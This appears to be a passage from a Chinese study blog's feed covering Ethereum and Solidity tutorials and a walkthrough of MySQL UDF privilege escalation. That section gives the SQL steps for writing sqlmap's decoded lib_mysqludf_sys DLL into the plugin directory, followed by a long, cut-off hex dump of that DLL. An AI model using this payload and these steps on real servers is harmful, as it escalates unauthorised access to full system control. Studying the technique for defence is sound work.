web3.eth.contract(abi)</span><br><span class="line">var contractAddress = /* our contract address on Ethereum after deploying */</span><br><span class="line">var ZombieFeeding = ZombieFeedingContract.at(contractAddress)</span><br><span class="line"></span><br><span class="line">// 假设我们有我们的僵尸ID和要攻击的猫咪ID</span><br><span class="line">let zombieId = 1;</span><br><span class="line">let kittyId = 1;</span><br><span class="line"></span><br><span class="line">// 要拿到猫咪的DNA，我们需要调用它的API。这些数据保存在它们的服务器上而不是区块链上。</span><br><span class="line">// 如果一切都在区块链上，我们就不用担心它们的服务器挂了，或者它们修改了API，</span><br><span class="line">// 或者因为不喜欢我们的僵尸游戏而封杀了我们</span><br><span class="line">let apiUrl = "https://api.cryptokitties.co/kitties/" + kittyId</span><br><span class="line">$.get(apiUrl, function(data) {</span><br><span class="line">  let imgUrl = data.image_url</span><br><span class="line">  // 一些显示图片的代码</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">// 当用户点击一只猫咪的时候:</span><br><span class="line">$(".kittyImage").click(function(e) {</span><br><span class="line">  // 调用我们合约的 `feedOnKitty` 函数</span><br><span class="line">  ZombieFeeding.feedOnKitty(zombieId, kittyId)</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">// 侦听来自我们合约的新僵尸事件好来处理</span><br><span class="line">ZombieFactory.NewZombie(function(error, result) {</span><br><span class="line">  if (error) return</span><br><span class="line">  // 这个函数用来显示僵尸:</span><br><span class="line">  generateZombie(result.zombieId, result.name, result.dna)</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><p><strong>实战演习</strong></p><p>选择一只你想猎食的小猫。你自家僵尸的 DNA 会和小猫的 DNA 结合，生成一个新的小猫僵尸，加入你的军团！</p><p>看到新僵尸上那可爱的猫咪腿了么？这是新僵尸最后DNA中最后两位数字 <code>99</code> 的功劳！</p><p>你想要的话随时可以重新开始。捕获了一只猫咪僵尸，你一定很高兴吧！（不过你只能持有一只），继续前进到下一章，完成第二课吧！</p><h2 id="8月11日"><a href="#8月11日" class="headerlink" title="8月11日"></a>8月11日</h2><table><thead><tr><th>今日学习内容</th></tr></thead><tbody><tr><td>Chainlink预言机的solidity进阶课程</td></tr></tbody></table><h3 id="Chainlink预言机的solidity进阶课程"><a href="#Chainlink预言机的solidity进阶课程" class="headerlink" title="Chainlink预言机的solidity进阶课程"></a>Chainlink预言机的solidity进阶课程</h3><p>部署一个FundMe的智能合约</p><p>需求：</p><ol><li>创建一个收款函数</li><li>记录投资人并且查看</li><li>在锁定期内，达到目标值，生产商可以提款</li><li>在锁定期内，未达到目标值，投资人可以退款</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">//1.创建一个收款函数</span><br><span class="line">//2.记录投资人并且查看</span><br><span class="line">//3.在锁定期内，达到目标值，生产商可以提款</span><br><span class="line">//4.在锁定期内，未达到目标值，投资人可以退款</span><br><span class="line"></span><br><span class="line">contract FundMe {</span><br><span class="line">    mapping (address =&gt; uint256) public fundersToAmount;</span><br><span class="line"></span><br><span class="line">    uint256 MINIMUM_VALUE = 1 * 10 ** 18;//创建一个最小捐款数额</span><br><span class="line"></span><br><span class="line">    function fund() external  payable {</span><br><span class="line">        require(msg.value &gt;= MINIMUM_VALUE, "Send more ETH");//如果不满足执行回退，返回"Send more ETH"</span><br><span class="line">        fundersToAmount[msg.sender] = msg.value;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>payable：要有这个参数才能执行收款</p><p>预言机：</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>以太坊学习</title>
      <link href="/2025/08/01/yi-tai-fang-xue-xi/"/>
      <url>/2025/08/01/yi-tai-fang-xue-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="以太坊学习"><a href="#以太坊学习" class="headerlink" title="以太坊学习"></a>以太坊学习</h1><h2 id="在remix上构建简单的水龙头合约"><a href="#在remix上构建简单的水龙头合约" class="headerlink" title="在remix上构建简单的水龙头合约"></a>在remix上构建简单的水龙头合约</h2><h2 id="搭建以太坊私链"><a href="#搭建以太坊私链" class="headerlink" title="搭建以太坊私链"></a>搭建以太坊私链</h2><p>首先，我们需要创建网络的“创世”（genesis）状态，这写在一个JSON文件里（例如，我们</p><p>将其命名为 genesis.json）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">  "config": {</span><br><span class="line">    "chainId": 631024,</span><br><span class="line">    "terminalTotalDifficulty": 0,</span><br><span class="line">    "ethash": {}</span><br><span class="line">  },</span><br><span class="line">  "difficulty": "2000",</span><br><span class="line">  "gasLimit": "2100000",</span><br><span class="line">  "alloc": {</span><br><span class="line">    "0x935482EE0d200CD36DFF06A5438A96CAC68Fdf56": {</span><br><span class="line">      "balance": "100000000000000000000"</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>核心字段说明</p><table><thead><tr><th align="left">字段</th><th align="left">值</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>config.chainId</code></td><td align="left">15</td><td align="left"><strong>链ID</strong>，用于区分不同以太坊网络（主网=1，测试网如Goerli=5，私有链可自定义）。</td></tr><tr><td align="left"><code>terminalTotalDifficulty</code></td><td align="left">0</td><td align="left"><strong>强制从区块0开始PoS</strong>（设为 <code>"0x1"</code> 可模拟主网过渡，但私有链建议直接PoS）。</td></tr><tr><td align="left"><code>ethash</code></td><td align="left"><code>{}</code></td><td align="left">声明使用PoW算法（即使实际运行PoS，Geth 仍需要此字段占位）。</td></tr><tr><td align="left"><code>difficulty</code></td><td align="left">“2000”</td><td align="left"><strong>初始挖矿难度</strong>，值越低越容易挖矿（私有链通常设低值以快速出块）。</td></tr><tr><td align="left"><code>gasLimit</code></td><td align="left">“2100000”</td><td align="left"><strong>每个区块的Gas上限</strong>，限制区块内交易的总计算量（默认与主网一致）。</td></tr><tr><td align="left"><code>alloc</code></td><td align="left">{…}</td><td align="left"><strong>预分配账户余额</strong>，指定初始账户地址及其ETH余额（单位：wei）。</td></tr></tbody></table><p>要创建一条以它作为创世块的区块链，我们可以使用下面的命令：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geth --datadir ./myChain init genesis.json</span><br></pre></td></tr></tbody></table></figure><p>在当前目录下运行 geth，就会启动这条私链，注意要将 networked 设置为与创世块配置里的chainId 一致。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geth --datadir ./myChain --networkid 631024</span><br></pre></td></tr></tbody></table></figure><p>使用console进行交互</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geth --datadir ./myChain --networkid 631024 console</span><br></pre></td></tr></tbody></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-01%20161207.png"></p><h2 id="Geth控制台命令"><a href="#Geth控制台命令" class="headerlink" title="Geth控制台命令"></a>Geth控制台命令</h2><p>Geth Console 是一个交互式的 JavaScript 执行环境，里面内置了一些用来操作以太坊的 JavaScript 对象，我们可以直接调用这些对象来获取区块链上的相关信息。这些对象主要包括：</p><table><thead><tr><th align="center">命令</th><th align="center">内容</th></tr></thead><tbody><tr><td align="center">eth</td><td align="center">主要包含对区块链进行访问和交互相关的方法</td></tr><tr><td align="center">net</td><td align="center">主要包含查看 p2p 网络状态的方法</td></tr><tr><td align="center">admin</td><td align="center">主要包含与管理节点相关的方法</td></tr><tr><td align="center">miner</td><td align="center">主要包含挖矿相关的一些方法</td></tr><tr><td align="center">personal</td><td align="center">包含账户管理的方法</td></tr><tr><td align="center">txpool</td><td align="center">包含查看交易内存池的方法</td></tr><tr><td align="center">web3</td><td align="center">包含以上所有对象，还包含一些通用方法</td></tr></tbody></table><p>常用命令有：</p><table><thead><tr><th align="center">命令</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">personal.newAccount()</td><td align="center">创建账户（Geth v1.11.0版本以上无法使用）</td></tr><tr><td align="center">personal.unlockAccount()</td><td align="center">解锁账户（Geth v1.11.0版本以上无法使用）</td></tr><tr><td align="center">eth.accounts</td><td align="center">列出系统中的账户</td></tr><tr><td align="center">eth.getBalance(“账户”)</td><td align="center">查看账户余额，返回值的单位是 Wei</td></tr><tr><td align="center">eth.blockNumber</td><td align="center">列出当前区块高度</td></tr><tr><td align="center">eth.getTransaction()</td><td align="center">获取交易信息</td></tr><tr><td align="center">eth.getBlock()</td><td align="center">获取区块信息</td></tr><tr><td align="center">miner.start()</td><td align="center">开始挖矿</td></tr><tr><td align="center">miner.stop()</td><td align="center">停止挖矿</td></tr><tr><td align="center">web3.fromWei()</td><td align="center">Wei 换算成以太币</td></tr><tr><td align="center">web3.toWei()</td><td align="center">以太币换算成 Wei</td></tr><tr><td align="center">txpool.status</td><td align="center">交易池中的状态</td></tr></tbody></table><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li>从 <strong>Geth v1.11.0</strong> 开始，<code>personal</code> API 默认被禁用（出于安全考虑），因为它涉及敏感操作（如账户解锁）</li></ul><blockquote><p><strong>创建账户</strong>解决方案：</p><p>直接在终端运行以下命令（无需进入控制台）：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geth account new --datadir ./your_data_dir</span><br></pre></td></tr></tbody></table></figure><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-01%20165856.png" style="zoom:67%;"></blockquote><ul><li><p><code>eth.sendTransaction({from:"0x935482EE0d200CD36DFF06A5438A96CAC68Fdf45",to:eth.accounts[0  ],value:1000000})</code>//从创世块时，创建的账户向其他账户转账是不成功的，因为keystore中没有这个账户</p></li><li><p><code>eth.sendTransaction({from:eth.accounts[0],to:"0x935482EE0d200CD36DFF06A5438A96CAC68Fdf45",value:1000000})</code>//从其他账户直接转账是不成功的，因为需要先解锁账户</p></li></ul><blockquote><p><strong>解锁账户</strong>解决方案：</p><p>方法 1：使用启动参数解锁账户（推荐）</p><p>直接在启动 Geth 时解锁账户（无需调用 <code>personal.unlockAccount</code>）：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geth --unlock "0xYourAccountAddress" --password ./password.txt</span><br></pre></td></tr></tbody></table></figure><ul><li>**<code>password.txt</code>**：包含账户密码的文本文件（需确保文件权限安全）。</li><li><strong>注意</strong>：需配合 <code>--allow-insecure-unlock</code> 参数（如果使用 HTTP RPC）。</li></ul><p> 方法 2：使用 <code>eth.sendTransaction</code> 自动解锁</p><p>Geth 支持在发送交易时临时解锁账户：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eth.<span class="title function_">sendTransaction</span>({</span><br><span class="line">  <span class="attr">from</span>: eth.<span class="property">accounts</span>[<span class="number">0</span>], </span><br><span class="line">  <span class="attr">to</span>: <span class="string">"0xRecipientAddress"</span>,</span><br><span class="line">  <span class="attr">value</span>: web3.<span class="title function_">toWei</span>(<span class="number">1</span>, <span class="string">"ether"</span>)</span><br><span class="line">}, <span class="string">"yourPassword"</span>);  <span class="comment">// 直接传入密码（不推荐，仅测试用）</span></span><br></pre></td></tr></tbody></table></figure></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">常用语句：</span><br><span class="line">web3.fromWei(eth.getBalance(“账户”),'ether')//以以太为单位查询账户</span><br><span class="line"></span><br><span class="line">eth.getBalance(eth.accounts[0]) //查看accounts列表中第一个用户账户余额</span><br><span class="line"></span><br><span class="line">miner.start(1) //开始挖矿</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>UDF提权</title>
      <link href="/2025/07/31/udf-ti-quan/"/>
      <url>/2025/07/31/udf-ti-quan/</url>
      
        <content type="html"><![CDATA[<h1 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h1><p>参考文章：<a href="https://blog.csdn.net/qq_44159028/article/details/121193134">https://blog.csdn.net/qq_44159028/article/details/121193134</a></p><h2 id="UDF介绍"><a href="#UDF介绍" class="headerlink" title="UDF介绍"></a>UDF介绍</h2><p>UDF：User Defined Function（用户自定义函数），是MySQL的一个扩展接口，用户可以通过自定义函数实现在MySQL中创建一些MySQL无法直接实现的功能，其添加的新函数可以在SQL语句中调用并执行。</p><ul><li>Windows中提权文件为udf.dll，Linux中为udf.so</li></ul><blockquote><p>动态链接库(DynamicLinkLibrary，缩写为DLL)是一个可以被其它应用程序共享的程序模块，其中封装了一些可以被共享的例程和资源。使用DLL的主要目的就是为了共享代码，DLL的代码可以被所有的Windows应用程序共享。</p></blockquote><h2 id="何时进行MySQL提权"><a href="#何时进行MySQL提权" class="headerlink" title="何时进行MySQL提权"></a>何时进行MySQL提权</h2><p>有时拿下了服务器的webshell，但是webshell的权限较低，有些操作无法执行，这是刚好拿到了MySQL的权限，就可以利用UDF来进行提权，进而拿到服务器操作系统的权限</p><ul><li>MySQL提权获得的权限大小取决于当前服务器以什么权限账户登录</li></ul><h2 id="提权的先决条件"><a href="#提权的先决条件" class="headerlink" title="提权的先决条件"></a>提权的先决条件</h2><ol><li>获取了MySQL的控制权限：知道MySQL的用户密码并且可以远程登录</li><li>MySQL具有写入权限，即secure_file_priv的值为空</li></ol><blockquote><table><thead><tr><th align="center">值</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">secure_file_priv = 空</td><td align="center">无任何限制，udf.dll可以写入任意位置</td></tr><tr><td align="center">secure_file_priv = /tmp/</td><td align="center">限制只能写入/tmp/目录</td></tr><tr><td align="center">secure_file_priv = NULL</td><td align="center">不允许写入</td></tr></tbody></table><p>secure_file_priv是用来限制load dumpfile、into outfile、load_file函数在哪个目录下拥有上传和读取文件的权限。</p><ul><li>注意为NULL和为空的区别</li></ul></blockquote><h2 id="版本特性"><a href="#版本特性" class="headerlink" title="版本特性"></a>版本特性</h2><p>udf提权操作中的一个步骤是将我们的udf文件上传到mysql的检索目录中，Windows系统下mysql各版本的检索目录有所不同</p><table><thead><tr><th>版本</th><th>路径</th></tr></thead><tbody><tr><td>MySQL &lt; 5.0</td><td>导出路径随意</td></tr><tr><td>5.0 &lt; MySQL &lt; 5.1</td><td>Windows Server 2000导出路径： C:\Winnt\system32<br>其他Windows系统导出路径均为：C:\Windows\udf.dll或C:\Windows\system32\udf.dll</td></tr><tr><td>MySQL &gt; 5.1</td><td>必须放置在MySQL的安装目录中的lib\plugin，没有该目录需自行创建</td></tr></tbody></table><h2 id="UDF文件位置"><a href="#UDF文件位置" class="headerlink" title="UDF文件位置"></a>UDF文件位置</h2><h3 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h3><p><code>sqlmap\data\udf\mysql</code>中，有Windows以及Linux的版本，根据不同操作系统进行选择，然后再根据是32位还是64位系统进行选择</p><h2 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h2><ol><li>查看MySQL是否具有写入权限，当secure_file_priv 返回为空时，证明具有写入权限</li></ol><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">'%secure%'</span>;</span><br></pre></td></tr></tbody></table></figure><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-01%20122844.png" style="zoom:67%;"><p>如果secure_file_priv的值不为空，我们可以在mysql/my.ini中查看是否有secure_file_priv 的参数，如果没有的话我们就添加 secure_file_priv = ‘ ‘ ，然后重启apache服务即可生效。</p><ol start="2"><li>上传UDF 的动态链接库文件（udf.dll / udf.so）</li></ol><p>先获取当前数据库及操作系统的架构情况</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @<span class="variable">@version_compile_os</span>, @<span class="variable">@version_compile_machine</span>;</span><br></pre></td></tr></tbody></table></figure><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-01%20123038.png" style="zoom:67%;"><p>这里我的MySQL是64位，操作系统是x86_64，那么这里需要上传64位的dll文件</p><p>SQLMAP中自带的动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。这里如果后缀名为.so_或dll_的话，就需要解码，如果后缀名为.so或.dll的话就不需要解码即可直接使用。这里sqlmap也自带了解码的py脚本，在/extra/cloak目录下，使用cloak.py解密即可</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cloak.py -d -i lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll</span><br></pre></td></tr></tbody></table></figure><p>解密后得到lib_mysqludf_sys_32.dll文件</p><p>此时，我这里mysql版本大于5.1，所以dll文件需要放在/lib/plugin下，但是plugin文件夹默认不存在，需要创建。如果发现没有lib路径的存在，需要使用NTFS ADS进行创建（在获取到shell的情况下，如果权限够，也可以使用webshell管理工具创建）通过以下命令查看插件的存放目录，同时可以确认安装的MySQL版本。此处，虽然显示了lib目录，但是其实并未创建。</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">'plugin%'</span>;</span><br></pre></td></tr></tbody></table></figure><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-01%20133608.png" style="zoom:67%;"><p>写入文件可以有三种方法，如下：</p><p>方法一：将文件直接写入（该方法有时候写入步骤只会写入一部分的内容，导致接下来的步骤都失败，此处我写入成功，但是无法创建自定义函数，所以建议使用方法二）</p><p>通过如下命令将解码后的dll文件写入到plugin的udf.dll文件中</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> hex(load_file(<span class="string">'B:\\1Cybersecurity tools\\SQLmap\\extra\\cloak\\lib_mysqludf_sys.dll'</span>)) <span class="keyword">into</span> dumpfile <span class="string">'B:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll'</span>;</span><br></pre></td></tr></tbody></table></figure><ul><li>ps：这里windows下目录结构要进行转义双写</li></ul><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-01%20135729.png" style="zoom:67%;"><p>方法二：直接写入十六进制数据</p><p>各操作系统以及位数的16进制UDF动态链接库文件数据详见：<a href="https://www.sqlsec.com/tools/udf.html">MySQL UDF 提权十六进制查询 | 国光</a></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000e80000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000677cbfda231dd189231dd189231dd18904dbbf89211dd18904dbbc892a1dd18904dbaa89261dd189231dd0890f1dd18904dbac89211dd18904dba089221dd18904dbab89221dd18904dba989221dd18952696368231dd189000000000000000000000000000000005045000064860300a727a15a0000000000000000f00022200b020800002000000010000000800000109f000000900000000000100000000000100000000200000400000000000000050002000000000000c000000010000000000000020000000000100000000000001000000000000000001000000000000010000000000000000000001000000098b2000008020000b0b10000e800000000b00000b00100000050000050010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000800000001000000000000000040000000000000000000000000000800000e0555058310000000000200000009000000012000000040000000000000000000000000000400000e02e727372630000000010000000b000000006000000160000000000000000000000000000400000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332e393100555058210d240209e1e421439d3bdfb7de7400000f0f0000002a0000490000d41de9feff833a007450488b05a421000049890009a24008cd4973d20a9f109c1899cd9f34272096280fb70593666d83fdb7410b30b001c332c0c3cc00c215cc92c9ba810034716a6febcc16e46c096a471853fdbf1fa4631c0fb605591688401e41c7011e00ffed6dd62b8b63bf01750f3f42088338007506c64b26ebdc01017b4e2d632b05b9e4b228ce25227ed20cd26f1f28152ab001c3f66d7bc2bf83ec38344a43895c243084b7fff6dbd90b09ff15c71f2b4885c04c8bd87512104c24df6eaeb9608707202dc4388e897c242873edcdfd33c048c7c1ff0033fbf2ae1c120976d9b75b1af7d122e901890b2dcc00be6feb166f28e3026e404848deda7fdb29f938d87459488d0d40ee4e0e813832983de4c1eb81403281480a9ee4435e4f81503281543281563261f37d4fb0018c48804028c34c49467607744e61deed584917e49260680a703c6527cd18782056c740045cf8bf33b64342188b48048b008d4c010239bd1e77d27d8bd947107543706d8045ec1be936130309884370900a00b69dee10c8980a18bc0cb3c6b00e07103fbcb37ddb0f49a585c974066f5d17b7086d21cf93cf047424ada3b9772d7110448b6949e2fa02c2eddfba52e2ce0212498d5c3001e83f0ffce85cd7fddd5febcb418b03c60430d2470d5734b70c58d7e22d0822d34313167bb75bce2618007ca01cff56677c84842f7198f4cf16c64373870d087c8c03d6e4240f79561e541e511e7292939c4e1e4b1e481e63c2425e3e1e1fcf2784ee87c71f1da0981f4c89c68685ee44241824580f6c59897486bb86db76381764bdb900d34c18284cb0db7e302d4d8bf146e8e7b901ee9b6dc1ec04e00dda4533ed4488670beef69b4ff04c39290f8413050673f215fdcfb8b9169125ac1c088be8747b418d5508e1c9b6b13ac0e6cc177c7466a04b6640fa50669047fc3f42858e1b0b9529328d7936ce6f7d61c16c304375cd8cc74803c8f56636b724d470143e51c5ba08e1d9b68d39cc1ceb13225975ad886cdbb6f050eb258bc77004cd1930ddfe9cdb803e30e2154874229245ffb176d8827811fef5887edd4d174ebe5a0eebc18424805ec606e71ada0001380c4c38f12a10f8386c04c6f0a0581a87e792317fd3dc5cd8d6d09d58747a28f2023f73b773df3e448d48406e41b80010b3748bd1f10df7c7ed33c9ab441a5356104cefa2dbe6b66c02c8d8154e1b8d54b94c350aede98d054a75890ba3b16e3b2dbc3133d2c7d0208925183bdf19b7b3bad2c80df2199d30ac581e29eb081433c0922fb384f13be0064ceb0033c029001bb0dfb65538ec024510ff10c9196600fb6f7f6c900390483b0d89293f751148c1c11066f7dddd6fdfb87502f3dac1c910e9150aeccc405361203b8b7d1b5801a05fdcd25b0bfbeef7f685dbc905112fd005020675098d430185bb76efb6205b42c703d59b0d3c48b406634136670b1c5805b12006615bd85bc3cf55d27f6cc7c7c376fc608468e140dcfbf1c2c63831e83be141bdd20f8503ee46bb7408075ee428073c0f8e0d8de6b61b6e2bc58ed3105fdcfd3e76fb0fb12d602e0a741ef290b9e803c91d19bfdb36931d4275e841320783f802740fb9ef6dc3b31fb70eca0208e2ed0d2f2e338e740fd2111912f874491412fc18dadc0b1fd958f847df72165f1803b6bb2d701e4ad0c9eb081573ed12ecf6bedbcf2774192d06429bd72d0698fbfb66d833db891db80e871db906716fc7feb59806e5413bd5dde26541042530bb7dbbbd002c0978081e8bf3f048b93d883072b0b7920a63c7741ad64618d7d29b2f1c6b75e3eb037bf5a79a5ed6390c950cdaeb3fea1f9f7db7f08e8f080644892d312d1bc485c0678fed62771a15e5de0dd6181abe7fddbbeec7050725024585f67507b404bb833d14ddc96e73068b212a0b2d5c6f11dedd264fe3029cf12c66012d3a273e9e9ebe10c58f38d240e468ec98717a60dce91748c3b14d22190f6c20483a5adbf308505851f0dd05bbee77df3d041f208915d12695d275133915d709ed7f38c3750b5a17c61e83fa017405040add6be00275338931d39d08a3b71b0d34c84e20c574134ac68b07863db9d7a64bfc1616e0c9016b3c1a0edc83ffb092ebda1535ab311bc11bdb5b0bd80c430c1dc817084d7bf787755c0b1841ffd385ff88ff03753970f79d75094a08aeeb8d1ca51e36ec648b171028adeb06d8192ecc298adc25f3008bc3659e8793708b218b8bf8b59d9e2a4055bf15eaa3894d7afab61b01018b080724b0d67d5d902dd9c2302f5e7d0ab1485825ff4ddb960c1e92387d2eda02f101d7136fa3f875056c0cfcfa7d918844a4fd258b036983eb2f9e8e090cefc6f852a1899e2681ec880068cd760dbffe73153f156705b8c648f25845b7390cb8283d1f2c586170c339def61624eb754148b73dc6364238004044230430090e662fcf40280578254703055c73874c1c51494e7d4bb1077f4bf0eb222b8093447bdd837d738d0e83c00812d13e8d67db7b642a059b240d20902f9c5ba25b701c2a7214097bc009cc3e1e666c926724766e833572dbff0b70dc7a142f482c38b0bb2493827b8ef083d2396a14019b15650ccb36dc9255b624c80a271b83d76c1854ba6a234e336b1784f781c4aca041592947a626231c0fd8cf53188186d9ef0d68295a4a148a8ef8ececcdd64427cb1366eb75b908674b32d21dea902d3a1c1128106464200a8b83af334463971bcb36e418c323db83a238243d05f62809993959b611402bdc678c90c136de1bc3017f37320296247f15f4f6120d6276d81bc00383e8013c2075643f289c8d3d53041a787f4b8d1d4c068d13a08491790ec372b3326129a9ef4f137f2344720cc96681394d5a75fcb7c3ff174863513c813c0a5045e1137c0a180b020f94c063e343029f4c63413cfec9b4ebed8d7ed24c03c1413c4014450458064525ffc25f6a4ab10018741f8b510b3bd2720a8b4108ed6ff8db03c209d072104183c113c128453bcb72e16fc796b05d1cc1c3cf4cc1267af7446992e1da85dcbd1f4c2bc15feafb5abed0140ccd0f3a24c1e81f600d2cfef7d083e001eb02584fd644ab360196ebcac0b66c3008eec18b01a7ffaa128d3cc77627252205cc11ce78dca606cb113f75463da70ff0dd4603241b471eb801000000277c29847f3fe520000081bff83c3dfc32a2df2d992b7dc7f83074149d6fa3d00e7f5dc6268b2dc285586b212430bc6286b6489934e10ab9b4c856e04671d849460bb50e731c0eb110d9be10a8d813fe6a4cb84c33dbceb8ff00856037ba1623e9b8338975dde016b1df744d44d89c1d39b705dbdd8449f7d3093720d2fbdc4b4646463605dee0e2e4b24746465e505a11000055c9a8aa298064547fb017d8069017303007d04e6f206172ffffdffe67756d656e7473096c6c6f77656420287564663a206c69625f6d79730bf6b7dd716c0d5f73085f696e666f29411c80edff232076657273696f6e20302e0134ededee17a178706563744b657861076c79201a6dbb7dfb652073747243672074791b2070766175d8299b6d21724f2f7477996d60010b1f438ef6f603fb72206e616d4c436f756c246e6f74cce8b66d3b63611320186d27796372ff850740310106023532023001240d0024f6ffb7ffd407001fc408001a740b15640c0010540b000b340a0004822776bbdcfe1918090018c40f13740e640b093427b763d4ed046217d41e5e3f1903241aedbacf2c5007390f2a07801abbdc6e8367165b16743711640c340b7bd85b770442130c390c01118350118b9b6df705530133871c03e4001d5d90ed60430e057b743f09baeeb0d80401072f67079403a06077dbc10701462f462b1074092f0db6d94e3416033b01000715bb0bb6bd971574062f64f7df21000884ddb640ae043439741f00bf20eeecedb6140629034c341f0ba903e1c2debe240f05c305340a13234bd36d9b6e23431e14c45f0f470a75b713760554094b01098909a2071e7de572bb1f1e742f12640d34870142b71582bb2e1311cf0c03ca96dd0e01380f387427005124a3aafec10246ddcd5d20d266d4ff555516c900178fa02a1b003011764bd56c039180bfa007e0126dd79ddd03703407f803680b0013026a76fbba8603540b14021814170b581590fb2f07d9eeecf60a150310340727030034075bd5b9dd7003e0336f0724b3cc755dd7750b30074203ac0b9007f5b61b94db03c03233920c1903c8ba05a0eb0b10074f8be80b508375afeb077303444707990ba0b65dd77507e503280bf0073a1c033c0038b7eb0b5007f71ca70b77b63bdb8b191d2f2007381dcb40071dac7b5d830